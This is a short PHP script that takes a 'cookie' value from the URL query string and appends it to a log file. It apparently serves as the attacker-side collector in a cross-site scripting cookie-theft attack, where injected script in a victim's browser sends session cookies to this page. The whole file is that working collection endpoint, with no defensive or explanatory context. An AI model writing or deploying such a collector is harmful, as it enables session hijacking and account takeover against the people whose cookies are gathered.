<?php
    $cookie = $_GET['cookie'];
    $fp = fopen('log_final.txt', 'a+');
    fwrite($fp, 'Cookie:' .$cookie.'\r\n');
    fclose($fp);
?>